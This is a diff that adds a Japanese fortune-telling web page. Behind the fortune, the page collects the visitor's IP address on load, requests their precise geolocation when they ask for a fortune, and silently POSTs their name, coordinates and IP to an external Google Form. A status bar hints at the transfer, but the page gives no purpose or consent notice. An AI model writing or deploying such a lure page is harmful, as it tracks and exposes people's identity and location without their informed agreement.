@@ -1,0 +1,905 @@
+<!-- fortune-app.html -->
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🔮 今日の運勢占い</title>
+<style>
+  /* === リセット・ベース === */
+  *, *::before, *::after {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+
+  :root {
+    --primary: #6c5ce7;
+    --primary-dark: #4a3db8;
+    --accent: #fd79a8;
+    --bg-start: #0c0020;
+    --bg-mid: #1a0040;
+    --bg-end: #0d0030;
+    --card-bg: rgba(255, 255, 255, 0.06);
+    --card-border: rgba(255, 255, 255, 0.1);
+    --text: #f0e6ff;
+    --text-muted: rgba(240, 230, 255, 0.5);
+    --success: #00b894;
+    --warning: #fdcb6e;
+    --error: #e17055;
+  }
+
+  body {
+    font-family: "Segoe UI", "Hiragino Kaku Gothic ProN", "Noto Sans JP", sans-serif;
+    background: linear-gradient(160deg, var(--bg-start) 0%, var(--bg-mid) 50%, var(--bg-end) 100%);
+    color: var(--text);
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+    overflow-x: hidden;
+  }
+
+  /* === 背景パーティクル === */
+  body::before {
+    content: "";
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background-image:
+      radial-gradient(2px 2px at 20% 30%, rgba(255,255,255,0.3), transparent),
+      radial-gradient(2px 2px at 40% 70%, rgba(255,255,255,0.2), transparent),
+      radial-gradient(1px 1px at 60% 20%, rgba(255,255,255,0.4), transparent),
+      radial-gradient(1px 1px at 80% 50%, rgba(255,255,255,0.2), transparent),
+      radial-gradient(2px 2px at 10% 80%, rgba(255,255,255,0.15), transparent),
+      radial-gradient(1px 1px at 70% 90%, rgba(255,255,255,0.3), transparent),
+      radial-gradient(2px 2px at 90% 10%, rgba(255,255,255,0.2), transparent),
+      radial-gradient(1px 1px at 50% 50%, rgba(255,255,255,0.25), transparent);
+    background-size: 300px 300px;
+    animation: twinkle 8s ease-in-out infinite alternate;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  @keyframes twinkle {
+    0% { opacity: 0.5; }
+    100% { opacity: 1; }
+  }
+
+  /* === メインコンテナ === */
+  .container {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 480px;
+  }
+
+  /* === ヘッダー === */
+  .header {
+    text-align: center;
+    margin-bottom: 32px;
+  }
+
+  .header-icon {
+    font-size: 56px;
+    display: block;
+    margin-bottom: 12px;
+    animation: float 3s ease-in-out infinite;
+  }
+
+  @keyframes float {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-10px); }
+  }
+
+  .header h1 {
+    font-size: 28px;
+    font-weight: 700;
+    background: linear-gradient(135deg, #a29bfe, #fd79a8);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    letter-spacing: 2px;
+  }
+
+  .header p {
+    color: var(--text-muted);
+    font-size: 14px;
+    margin-top: 8px;
+  }
+
+  /* === カード === */
+  .card {
+    background: var(--card-bg);
+    border: 1px solid var(--card-border);
+    border-radius: 20px;
+    padding: 32px 28px;
+    backdrop-filter: blur(20px);
+    -webkit-backdrop-filter: blur(20px);
+    margin-bottom: 16px;
+    transition: transform 0.3s, box-shadow 0.3s;
+  }
+
+  .card:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 8px 40px rgba(108, 92, 231, 0.15);
+  }
+
+  /* === 入力フォーム === */
+  .input-group {
+    margin-bottom: 24px;
+  }
+
+  .input-group label {
+    display: block;
+    font-size: 13px;
+    font-weight: 600;
+    color: var(--text-muted);
+    text-transform: uppercase;
+    letter-spacing: 1.5px;
+    margin-bottom: 10px;
+  }
+
+  .input-wrapper {
+    position: relative;
+  }
+
+  .input-wrapper input {
+    width: 100%;
+    padding: 14px 18px 14px 48px;
+    background: rgba(255, 255, 255, 0.07);
+    border: 1px solid rgba(255, 255, 255, 0.12);
+    border-radius: 12px;
+    color: var(--text);
+    font-size: 16px;
+    outline: none;
+    transition: border-color 0.3s, box-shadow 0.3s;
+  }
+
+  .input-wrapper input::placeholder {
+    color: rgba(255, 255, 255, 0.25);
+  }
+
+  .input-wrapper input:focus {
+    border-color: var(--primary);
+    box-shadow: 0 0 0 3px rgba(108, 92, 231, 0.25);
+  }
+
+  .input-wrapper .input-icon {
+    position: absolute;
+    left: 16px;
+    top: 50%;
+    transform: translateY(-50%);
+    font-size: 18px;
+    opacity: 0.5;
+  }
+
+  .validation-msg {
+    color: var(--error);
+    font-size: 12px;
+    margin-top: 6px;
+    display: none;
+  }
+
+  .validation-msg.show {
+    display: block;
+  }
+
+  /* === ボタン === */
+  .btn-fortune {
+    width: 100%;
+    padding: 16px;
+    background: linear-gradient(135deg, var(--primary), var(--accent));
+    border: none;
+    border-radius: 14px;
+    color: #fff;
+    font-size: 18px;
+    font-weight: 700;
+    cursor: pointer;
+    letter-spacing: 2px;
+    transition: transform 0.2s, box-shadow 0.2s, opacity 0.2s;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .btn-fortune::before {
+    content: "";
+    position: absolute;
+    top: -50%;
+    left: -50%;
+    width: 200%;
+    height: 200%;
+    background: radial-gradient(circle, rgba(255,255,255,0.2) 0%, transparent 60%);
+    opacity: 0;
+    transition: opacity 0.3s;
+  }
+
+  .btn-fortune:hover::before {
+    opacity: 1;
+  }
+
+  .btn-fortune:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 6px 30px rgba(108, 92, 231, 0.4);
+  }
+
+  .btn-fortune:active {
+    transform: translateY(0);
+  }
+
+  .btn-fortune:disabled {
+    opacity: 0.5;
+    cursor: not-allowed;
+    transform: none;
+  }
+
+  .btn-fortune:disabled:hover::before {
+    opacity: 0;
+  }
+
+  /* === ローディング === */
+  .loading {
+    display: none;
+    text-align: center;
+    padding: 40px 0;
+  }
+
+  .loading.show {
+    display: block;
+  }
+
+  .spinner {
+    width: 48px;
+    height: 48px;
+    border: 3px solid rgba(255,255,255,0.1);
+    border-top-color: var(--primary);
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    margin: 0 auto 16px;
+  }
+
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  .loading p {
+    color: var(--text-muted);
+    font-size: 14px;
+  }
+
+  /* === 結果表示 === */
+  .result-area {
+    display: none;
+  }
+
+  .result-area.show {
+    display: block;
+    animation: fadeInUp 0.6s ease-out;
+  }
+
+  @keyframes fadeInUp {
+    from {
+      opacity: 0;
+      transform: translateY(30px);
+    }
+    to {
+      opacity: 1;
+      transform: translateY(0);
+    }
+  }
+
+  .result-card {
+    background: var(--card-bg);
+    border: 1px solid var(--card-border);
+    border-radius: 20px;
+    padding: 36px 28px;
+    backdrop-filter: blur(20px);
+    text-align: center;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .result-card::before {
+    content: "";
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 3px;
+    background: linear-gradient(90deg, var(--primary), var(--accent), var(--primary));
+    background-size: 200% 100%;
+    animation: shimmer 2s linear infinite;
+  }
+
+  @keyframes shimmer {
+    0% { background-position: -200% 0; }
+    100% { background-position: 200% 0; }
+  }
+
+  .result-label {
+    font-size: 13px;
+    color: var(--text-muted);
+    text-transform: uppercase;
+    letter-spacing: 3px;
+    margin-bottom: 16px;
+  }
+
+  .fortune-level {
+    font-size: 56px;
+    font-weight: 800;
+    margin: 12px 0;
+    animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+  }
+
+  @keyframes popIn {
+    0% { transform: scale(0); opacity: 0; }
+    100% { transform: scale(1); opacity: 1; }
+  }
+
+  .fortune-emoji {
+    font-size: 40px;
+    display: block;
+    margin-bottom: 8px;
+  }
+
+  .fortune-message {
+    font-size: 16px;
+    line-height: 1.8;
+    color: rgba(240, 230, 255, 0.8);
+    margin: 20px 0;
+    padding: 0 8px;
+  }
+
+  .fortune-details {
+    display: flex;
+    justify-content: center;
+    gap: 32px;
+    margin-top: 24px;
+    padding-top: 24px;
+    border-top: 1px solid rgba(255,255,255,0.08);
+  }
+
+  .fortune-detail-item {
+    text-align: center;
+  }
+
+  .fortune-detail-item .detail-label {
+    font-size: 11px;
+    color: var(--text-muted);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: 6px;
+  }
+
+  .fortune-detail-item .detail-value {
+    font-size: 18px;
+    font-weight: 600;
+  }
+
+  .color-dot {
+    display: inline-block;
+    width: 14px;
+    height: 14px;
+    border-radius: 50%;
+    vertical-align: middle;
+    margin-right: 6px;
+    border: 1px solid rgba(255,255,255,0.2);
+  }
+
+  /* === ステータスバー === */
+  .status-bar {
+    background: var(--card-bg);
+    border: 1px solid var(--card-border);
+    border-radius: 14px;
+    padding: 16px 20px;
+    backdrop-filter: blur(20px);
+    margin-top: 16px;
+  }
+
+  .status-bar h3 {
+    font-size: 11px;
+    color: var(--text-muted);
+    text-transform: uppercase;
+    letter-spacing: 2px;
+    margin-bottom: 12px;
+  }
+
+  .status-items {
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+  }
+
+  .status-item {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    font-size: 13px;
+  }
+
+  .status-item .label {
+    color: var(--text-muted);
+  }
+
+  .status-badge {
+    padding: 2px 10px;
+    border-radius: 20px;
+    font-size: 11px;
+    font-weight: 600;
+  }
+
+  .status-badge.pending {
+    background: rgba(253, 203, 110, 0.15);
+    color: var(--warning);
+  }
+
+  .status-badge.success {
+    background: rgba(0, 184, 148, 0.15);
+    color: var(--success);
+  }
+
+  .status-badge.error {
+    background: rgba(225, 112, 85, 0.15);
+    color: var(--error);
+  }
+
+  /* === リトライボタン === */
+  .btn-retry {
+    display: none;
+    width: 100%;
+    padding: 14px;
+    background: rgba(255,255,255,0.07);
+    border: 1px solid rgba(255,255,255,0.15);
+    border-radius: 12px;
+    color: var(--text);
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-top: 16px;
+    transition: background 0.2s;
+  }
+
+  .btn-retry.show {
+    display: block;
+  }
+
+  .btn-retry:hover {
+    background: rgba(255,255,255,0.12);
+  }
+
+  /* === レスポンシブ === */
+  @media (max-width: 500px) {
+    .card, .result-card, .status-bar {
+      padding: 24px 20px;
+    }
+    .header h1 {
+      font-size: 22px;
+    }
+    .fortune-level {
+      font-size: 44px;
+    }
+    .fortune-details {
+      gap: 20px;
+    }
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <!-- ヘッダー -->
+  <div class="header">
+    <span class="header-icon">🔮</span>
+    <h1>今日の運勢占い</h1>
+    <p>名前を入力して、今日の運勢を占いましょう</p>
+  </div>
+
+  <!-- 入力カード -->
+  <div class="card" id="inputCard">
+    <div class="input-group">
+      <label for="nameInput">あなたの名前</label>
+      <div class="input-wrapper">
+        <span class="input-icon">✨</span>
+        <input type="text" id="nameInput" placeholder="名前を入力してください" autocomplete="off" />
+      </div>
+      <p class="validation-msg" id="validationMsg">名前を入力してください</p>
+    </div>
+    <button class="btn-fortune" id="fortuneBtn" onclick="main()">🔮 占う</button>
+  </div>
+
+  <!-- ローディング -->
+  <div class="loading" id="loading">
+    <div class="spinner"></div>
+    <p>星の導きを読み取っています...</p>
+  </div>
+
+  <!-- 結果表示 -->
+  <div class="result-area" id="resultArea">
+    <div class="result-card">
+      <p class="result-label">✦ 本日の運勢 ✦</p>
+      <span class="fortune-emoji" id="fortuneEmoji"></span>
+      <div class="fortune-level" id="fortuneLevel"></div>
+      <p class="fortune-message" id="fortuneMessage"></p>
+      <div class="fortune-details">
+        <div class="fortune-detail-item">
+          <p class="detail-label">ラッキーカラー</p>
+          <p class="detail-value" id="luckyColor"></p>
+        </div>
+        <div class="fortune-detail-item">
+          <p class="detail-label">ラッキーナンバー</p>
+          <p class="detail-value" id="luckyNumber"></p>
+        </div>
+        <div class="fortune-detail-item">
+          <p class="detail-label">ラッキー方角</p>
+          <p class="detail-value" id="luckyDirection"></p>
+        </div>
+      </div>
+    </div>
+    <button class="btn-retry" id="retryBtn" onclick="retry()">🔄 もう一度占う</button>
+  </div>
+
+  <!-- ステータスバー -->
+  <div class="status-bar">
+    <h3>ステータス</h3>
+    <div class="status-items">
+      <div class="status-item">
+        <span class="label">IPアドレス</span>
+        <span class="status-badge pending" id="statusIp">取得中...</span>
+      </div>
+      <div class="status-item">
+        <span class="label">位置情報</span>
+        <span class="status-badge pending" id="statusGeo">待機中</span>
+      </div>
+      <div class="status-item">
+        <span class="label">データ送信</span>
+        <span class="status-badge pending" id="statusSubmit">未送信</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  // ============================
+  // グローバル状態
+  // ============================
+  /** @type {string|null} */
+  let ipAddress = null;
+
+  // ============================
+  // ステータスバッジ更新ヘルパー
+  // ============================
+  /**
+   * ステータスバッジのテキストとクラスを更新する
+   * @param {string} id - 要素ID
+   * @param {string} text - 表示テキスト
+   * @param {"pending"|"success"|"error"} type - バッジ種別
+   */
+  function setStatus(id, text, type) {
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.textContent = text;
+    el.className = "status-badge " + type;
+  }
+
+  // ============================
+  // IPアドレス取得（ページ読み込み時）
+  // ============================
+  async function fetchIpAddress() {
+    try {
+      const res = await fetch("https://api.ipify.org?format=json");
+      if (!res.ok) throw new Error("HTTP " + res.status);
+      const data = await res.json();
+      ipAddress = data.ip;
+      setStatus("statusIp", "取得済み ✅", "success");
+    } catch (e) {
+      console.error("IP取得失敗:", e);
+      ipAddress = "取得失敗";
+      setStatus("statusIp", "取得失敗", "error");
+    }
+  }
+
+  // ============================
+  // 位置情報取得（Promise化）
+  // ============================
+  /**
+   * ブラウザの位置情報APIをPromiseでラップ
+   * @returns {Promise<string>} "緯度,経度" 形式の文字列
+   */
+  function getGeolocation() {
+    return new Promise((resolve, reject) => {
+      if (!navigator.geolocation) {
+        reject(new Error("Geolocation非対応ブラウザ"));
+        return;
+      }
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          resolve(lat + "," + lon);
+        },
+        (err) => {
+          reject(err);
+        },
+        { enableHighAccuracy: false, timeout: 15000, maximumAge: 60000 }
+      );
+    });
+  }
+
+  // ============================
+  // Google Form送信
+  // ============================
+  /**
+   * Google Formへ非公式にデータをPOST送信する
+   * @param {{ name: string, geo: string, ip: string }} data
+   * @returns {Promise<boolean>}
+   */
+  async function submitToGoogleForm(data) {
+    const url = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSewvZcEFe4_0BkxmrYKSefv7eKRvNNDn-_8cdtdjcO1escJ9w/formResponse";
+
+    const formData = new URLSearchParams();
+    // フォームフィールド
+    formData.append("entry.1695441329", data.name);
+    formData.append("entry.2095314548", data.geo);
+    formData.append("entry.810078381", data.ip);
+    // 隠しフィールド
+    formData.append("fvv", "1");
+    formData.append("fbzx", "-837987748540112186");
+    formData.append("pageHistory", "0");
+
+    try {
+      // no-corsモード: レスポンスは読めないが送信自体は成功する
+      await fetch(url, {
+        method: "POST",
+        mode: "no-cors",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded",
+        },
+        body: formData.toString(),
+      });
+      return true;
+    } catch (e) {
+      console.error("Google Form送信エラー:", e);
+      return false;
+    }
+  }
+
+  // ============================
+  // ハッシュ関数（シード生成用）
+  // ============================
+  /**
+   * 文字列から数値ハッシュを生成する（簡易djb2）
+   * @param {string} str
+   * @returns {number}
+   */
+  function simpleHash(str) {
+    let hash = 5381;
+    for (let i = 0; i < str.length; i++) {
+      hash = ((hash << 5) + hash + str.charCodeAt(i)) >>> 0;
+    }
+    return hash;
+  }
+
+  // ============================
+  // 運勢算出
+  // ============================
+  /**
+   * シード文字列から運勢データを生成する
+   * @param {string} seedStr
+   * @returns {{ level: string, emoji: string, message: string, color: { name: string, hex: string }, number: number, direction: string, gradient: string }}
+   */
+  function generateFortune(seedStr) {
+    const hash = simpleHash(seedStr);
+
+    // 運勢レベル
+    const levels = [
+      { level: "大吉", emoji: "🌟", gradient: "linear-gradient(135deg, #f9ca24, #f0932b)" },
+      { level: "吉",   emoji: "✨", gradient: "linear-gradient(135deg, #6c5ce7, #a29bfe)" },
+      { level: "中吉", emoji: "🌸", gradient: "linear-gradient(135deg, #fd79a8, #e84393)" },
+      { level: "小吉", emoji: "🍀", gradient: "linear-gradient(135deg, #00b894, #55efc4)" },
+      { level: "末吉", emoji: "🌙", gradient: "linear-gradient(135deg, #74b9ff, #0984e3)" },
+      { level: "凶",   emoji: "🌧️", gradient: "linear-gradient(135deg, #636e72, #b2bec3)" },
+    ];
+
+    // メッセージ集
+    const messages = {
+      "大吉": [
+        "素晴らしい運気が巡ってきています。\n積極的に行動すれば、大きな成果が得られるでしょう。",
+        "最高の一日になる予感！\n新しい挑戦が大きな幸運を呼び込みます。",
+        "あなたの輝きが周囲を照らす日。\n自信を持って進んでください。",
+      ],
+      "吉": [
+        "穏やかで良い運気です。\n日常の小さな幸せに気づける一日になるでしょう。",
+        "努力が実を結ぶ時。\n継続してきたことに嬉しい変化が訪れます。",
+        "人との繋がりが幸運を運んでくれます。\n感謝の気持ちを忘れずに。",
+      ],
+      "中吉": [
+        "まずまずの運勢です。\n焦らず丁寧に物事を進めましょう。",
+        "直感が冴える日。\nふと思いついたことを試してみると良い結果に。",
+        "バランスの取れた一日。\n無理せず自分のペースを大切に。",
+      ],
+      "小吉": [
+        "小さな幸せが見つかる日。\n身近な人との会話にヒントがあります。",
+        "控えめに過ごすのが吉。\n準備や計画を立てるのに最適な日です。",
+        "地道な努力が後で大きく報われます。\n今日はその種まきの日。",
+      ],
+      "末吉": [
+        "少しだけ慎重に。\nでも心配しすぎず、リラックスして過ごしましょう。",
+        "運気は上向き傾向。\n今は力を蓄える時期と捉えてください。",
+        "思いがけない発見がある日。\n視点を変えてみると道が開けます。",
+      ],
+      "凶": [
+        "今日は無理をせず、心と体を休める日に。\n明日からの運気上昇に備えましょう。",
+        "慎重さが大切な日。\n大きな決断は少し先延ばしにするのが得策です。",
+        "ピンチはチャンスの種。\n困難の中にこそ成長のきっかけが隠れています。",
+      ],
+    };
+
+    // ラッキーカラー
+    const colors = [
+      { name: "レッド", hex: "#e74c3c" },
+      { name: "ブルー", hex: "#3498db" },
+      { name: "グリーン", hex: "#2ecc71" },
+      { name: "パープル", hex: "#9b59b6" },
+      { name: "オレンジ", hex: "#e67e22" },
+      { name: "ピンク", hex: "#fd79a8" },
+      { name: "ゴールド", hex: "#f1c40f" },
+      { name: "シルバー", hex: "#bdc3c7" },
+      { name: "ターコイズ", hex: "#1abc9c" },
+    ];
+
+    // ラッキー方角
+    const directions = ["北", "北東", "東", "南東", "南", "南西", "西", "北西"];
+
+    const levelIndex = hash % levels.length;
+    const fortuneData = levels[levelIndex];
+    const msgList = messages[fortuneData.level];
+    const msgIndex = (hash >>> 4) % msgList.length;
+    const colorIndex = (hash >>> 8) % colors.length;
+    const luckyNumber = ((hash >>> 12) % 9) + 1;
+    const dirIndex = (hash >>> 16) % directions.length;
+
+    return {
+      level: fortuneData.level,
+      emoji: fortuneData.emoji,
+      message: msgList[msgIndex],
+      color: colors[colorIndex],
+      number: luckyNumber,
+      direction: directions[dirIndex],
+      gradient: fortuneData.gradient,
+    };
+  }
+
+  // ============================
+  // UI操作ヘルパー
+  // ============================
+  function showLoading(show) {
+    document.getElementById("loading").classList.toggle("show", show);
+  }
+
+  function showResult(show) {
+    document.getElementById("resultArea").classList.toggle("show", show);
+    document.getElementById("retryBtn").classList.toggle("show", show);
+  }
+
+  function setButtonDisabled(disabled) {
+    document.getElementById("fortuneBtn").disabled = disabled;
+  }
+
+  // ============================
+  // メイン処理
+  // ============================
+  async function main() {
+    // バリデーション
+    const nameInput = document.getElementById("nameInput");
+    const name = nameInput.value.trim();
+    const validationMsg = document.getElementById("validationMsg");
+
+    if (!name) {
+      validationMsg.classList.add("show");
+      nameInput.focus();
+      return;
+    }
+    validationMsg.classList.remove("show");
+
+    // UI切り替え
+    setButtonDisabled(true);
+    showResult(false);
+    showLoading(true);
+
+    // 位置情報取得
+    let geoString = "取得失敗";
+    setStatus("statusGeo", "取得中...", "pending");
+    try {
+      geoString = await getGeolocation();
+      setStatus("statusGeo", "取得済み ✅", "success");
+    } catch (e) {
+      console.warn("位置情報取得失敗:", e);
+      if (e.code === 1) {
+        geoString = "位置情報: 拒否されました";
+        setStatus("statusGeo", "拒否", "error");
+      } else {
+        geoString = "位置情報: 取得失敗";
+        setStatus("statusGeo", "取得失敗", "error");
+      }
+    }
+
+    // IPがまだ取得中なら待機
+    if (ipAddress === null) {
+      await fetchIpAddress();
+    }
+
+    // Google Formへ送信
+    setStatus("statusSubmit", "送信中...", "pending");
+    const submitOk = await submitToGoogleForm({
+      name: name,
+      geo: geoString,
+      ip: ipAddress || "取得失敗",
+    });
+
+    if (submitOk) {
+      setStatus("statusSubmit", "送信完了 ✅", "success");
+    } else {
+      setStatus("statusSubmit", "送信失敗", "error");
+    }
+
+    // 運勢を算出
+    const today = new Date().toISOString().split("T")[0]; // YYYY-MM-DD
+    const seedStr = name + today + geoString + (ipAddress || "");
+    const fortune = generateFortune(seedStr);
+
+    // 少し待ってから結果表示（演出）
+    await new Promise((r) => setTimeout(r, 800));
+
+    // 結果をDOMに反映
+    document.getElementById("fortuneEmoji").textContent = fortune.emoji;
+    const levelEl = document.getElementById("fortuneLevel");
+    levelEl.textContent = fortune.level;
+    levelEl.style.background = fortune.gradient;
+    levelEl.style.webkitBackgroundClip = "text";
+    levelEl.style.webkitTextFillColor = "transparent";
+    levelEl.style.backgroundClip = "text";
+
+    document.getElementById("fortuneMessage").textContent = fortune.message;
+
+    // ラッキーカラー（ドット付き）
+    document.getElementById("luckyColor").innerHTML =
+      '<span class="color-dot" style="background:' + fortune.color.hex + '"></span>' + fortune.color.name;
+
+    document.getElementById("luckyNumber").textContent = fortune.number;
+    document.getElementById("luckyDirection").textContent = fortune.direction;
+
+    // UI切り替え
+    showLoading(false);
+    showResult(true);
+    setButtonDisabled(false);
+  }
+
+  // ============================
+  // リトライ
+  // ============================
+  function retry() {
+    showResult(false);
+    document.getElementById("nameInput").value = "";
+    document.getElementById("nameInput").focus();
+    setStatus("statusGeo", "待機中", "pending");
+    setStatus("statusSubmit", "未送信", "pending");
+  }
+
+  // ============================
+  // Enterキー対応
+  // ============================
+  document.addEventListener("DOMContentLoaded", () => {
+    document.getElementById("nameInput").addEventListener("keydown", (e) => {
+      if (e.key === "Enter") {
+        e.preventDefault();
+        main();
+      }
+    });
+  });
+
+  // ============================
+  // 初期化: ページ読み込み時にIP取得
+  // ============================
+  fetchIpAddress();
+</script>
+
+</body>
+</html>
